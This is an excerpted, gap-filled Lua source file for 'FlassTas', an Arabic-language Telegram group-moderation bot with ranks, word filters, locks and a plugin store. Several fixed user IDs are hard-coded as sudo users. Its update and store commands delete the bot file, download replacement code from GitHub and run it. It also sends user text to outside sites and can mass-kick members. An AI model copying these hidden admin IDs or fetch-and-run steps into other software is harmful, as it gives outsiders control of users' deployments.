...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./FlassTas.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/FlassTasTEAM/Files_FlassTas/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1186900224,782862120,1377559539}   
function SudoBot(msg)  
local FlassTas = false  
...
var = true 
elseif tonumber(user_id) == tonumber(1377559539) then
var = true  
...
local FlassTas_Msg = ''  
if msgs < 100 then 
FlassTas_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
FlassTas_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
FlassTas_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
FlassTas_Msg = 'متفاعل' 
elseif msgs < 1200 then 
FlassTas_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
FlassTas_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
FlassTas_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
FlassTas_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
FlassTas_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
FlassTas_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
FlassTas_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
FlassTas_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
FlassTas_Msg = 'رب التفاعل'  
end 
return FlassTas_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceFlassTas(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,FlassTas_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf FlassTas.lua')
os.execute('wget https://raw.githubusercontent.com/FlassTasTEAM/FlassTas/master/FlassTas.lua')
send(msg.chat_id_, msg.id_,' ٭ ⪼تم تحديث السورس \n ٭ ⪼لديك اخر اصدار لسورس فلسطس\n ٭ ⪼الاصدار » { 1.3v}')
dofile('FlassTas.lua')  
end
if text == 'الاصدار ⋆' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ٭ ⪼اصدار سورس فلسطس \n ٭ ⪼الاصدار »{ 1.3v}')
end
if text == 'قناه تحديثات البوت ⋆' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ٭ ⪼[مبرامج سورس](t.me/FlassTas) \n ٭ ⪼[قناه السورس](t.me/FlassTas10)')
end
...
send(msg.chat_id_, msg.id_,'٭ ⪼ عدد الكروبات الان » { '..#group..' }'..FlassTask..''..FlassTas..'\n٭ ⪼ الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ٭ ⪼العضو » ['..result.title_..'](t.me/'..(username or 'FlassTas10')..')'
status  = '\n ٭ ⪼تم ترقيته مطور'
...
usertext = '\n ٭ ⪼العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'FlassTas10')..')'
status  = '\n ٭ ⪼تم ترقيته مطور'
...
local FlassTas1_Msg = database:get(bot_id.."FlassTas1:Add:Filter:Rp2"..text..msg.chat_id_)   
if FlassTas1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ٭ ⪼العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'FlassTas10')..') \n ٭ ⪼'..FlassTas1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if FlassTas_Msg and not Special(msg) then  
local FlassTas_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if FlassTas_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ٭ ⪼العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ٭ ⪼["..FlassTas_Msg.."] \n")
else
send(msg.chat_id_,0," ٭ ⪼العضو : {["..data.first_name_.."](T.ME/FlassTas10)}\n ٭ ⪼["..FlassTas_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ٭ ⪼عذرا » {["..data.first_name_.."](T.ME/FlassTas10)}\n ٭ ⪼عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
Text = [[
╭──── • ◈ • ────╮
么 [𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐋𝐀𝐒𝐒𝐓𝐀𝐒](http://t.me/FlassTas10)
么 [𝑨𝑺𝑲 𝑻𝑶 𝑴𝑬](http://t.me/FlassTas4_bot)
么 [𝐅𝐋𝐀𝐒𝐒𝐓𝐀𝐒](http://t.me/FlassTas)
么 [𝑵𝑨𝑮𝑬𝑯](http://t.me/N2GEH)
╰──── • ◈ • ────╯
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ٭ ⪼بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'FlassTas10')..') \n ٭ ⪼تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ٭ ⪼بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'FlassTas10')..') \n ٭ ⪼تـم قفـل التاك بالكتم ')
end,nil)   
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/FlassTasTEAM/Files_FlassTas/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ٭ ⪼اهلا بك في متجر ملفات فلسطس\n ٭ ⪼ملفات السورس ↓\n≪━━━━━━𝑭𝑳𝑨𝑺𝑺𝑻𝑨𝑺━━━━━━≫\n\n"
...
local json_file, res = https.request("https://raw.githubusercontent.com/FlassTasTEAM/Files_FlassTas/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('FlassTas.lua')  
else
send(msg.chat_id_, msg.id_," ٭ ⪼عذرا الملف لايدعم سورس فلسطس \n") 
end
return false
end
...
local UserName = (b.username_ or "FlassTas10")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ٭ ⪼لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'FlassTas10')..')'
status  = '\n ٭ ⪼تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ٭ ⪼العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ٭ ⪼العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'FlassTas10')..')'
...
database:set(bot_id.."FlassTas1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."FlassTas1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ٭ ⪼ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."FlassTas1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."FlassTas1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."FlassTas1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."FlassTas1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ٭ ⪼تم منع الكلمه مع التحذير")  
database:del(bot_id.."FlassTas1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."FlassTas1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."FlassTas1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."FlassTas1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ٭ ⪼ارسل الكلمه الان")  
database:set(bot_id.."FlassTas1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."FlassTas1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."FlassTas1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."FlassTas1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."FlassTas1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."FlassTas1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."FlassTas1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."FlassTas1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."FlassTas1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ٭ ⪼قائمة المنع \n≪━━━━━━𝑭𝑳𝑨𝑺𝑺𝑻𝑨𝑺━━━━━━≫\n"
for k,v in pairs(list) do  
local FlassTas_Msg = database:get(bot_id.."FlassTas1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..FlassTas_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ٭ ⪼العضو » ['..result.title_..'](t.me/'..(text1[3] or 'FlassTas10')..')'..'\n ٭ ⪼تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'فلسطس').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'فلسطس')
local FlassTas_Msg = {
'عمغي 🥺💕.',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
...
send(msg.chat_id_, msg.id_,'['..FlassTas_Msg[math.random(#FlassTas_Msg)]..']') 
return false
end
...
},function(ta,FlassTas)
local t = "\nツ قائمة الاعضاء \n≪━━━━━━𝑭𝑳𝑨𝑺𝑺𝑻𝑨𝑺━━━━━━≫\n"
x = 0
local list = FlassTas.members_
for k, v in pairs(list) do
x = x + 1
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فلسطس').." غادر" or text == 'غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'FlassTas10')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
FlassTasdx(msg.chat_id_, msg.id_, ' ٭ ⪼ايدي المجموعة » ( '..msg.chat_id_..' )\n ٭ ⪼عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ٭ ⪼عدد المحظورين » ( *'..data.kicked_count_..' )*\n ٭ ⪼عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
*⋆م10 ◂ اوامر الاعضاء*
ٴ≪━━━━━━𝑭𝑳𝑨𝑺𝑺𝑻𝑨𝑺━━━━━━≫ٴ
➢ .[𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝑭𝑳𝑨𝑺𝑺𝑻𝑨𝑺](t.me/FlassTas10)➢ 
]]
...
zh = https.request('https://rudi-dev.tk/Amir1/FlassTas.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n٭ ⪼قائمه الزخرفه \nٴ⋆∫ٴ≪━━━━━━𝑭𝑳𝑨𝑺𝑺𝑻𝑨𝑺━━━━━━≫ٴ⋆∫○ٴ \n"
i = 0
...
send(msg.chat_id_, msg.id_, t..'ٴ⋆∫ٴ≪━━━━━━𝑭𝑳𝑨𝑺𝑺𝑻𝑨𝑺━━━━━━≫ٴ⋆∫○ٴ\n٭ ⪼➢ .[𝘊𝘩𝘢𝘯𝘯𝘦𝘭 𝑭𝑳𝑨𝑺𝑺𝑻𝑨𝑺](t.me/FlassTas10)➢ ')
end
...
gk = https.request('https://rudi-dev.tk/Amir2/FlassTas.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
...
ge = https.request('https://rudi-dev.tk/Amir3/FlassTas.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فلسطس')
...
FlassTas = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(FlassTas)
...
--------------------------------------------------------------------------------------------------------------
SourceFlassTas(data.message_,data)
...
------------------------------------------------------------------------
local FlassTasAbot = database:get(bot_id.."FlassTas1:Add:Filter:Rp2"..text..result.chat_id_)   
if FlassTasAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ٭ ⪼العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ٭ ⪼["..FlassTasAbot.."] \n") 
else
...
------------------------------------------------------------------------
if text then
local FlassTas1_Msg = database:get(bot_id.."FlassTas1:Add:Filter:Rp2"..text..result.chat_id_)   
if FlassTas1_Msg then    
send(msg.chat_id_, msg.id_," ٭ ⪼"..FlassTas1_Msg)
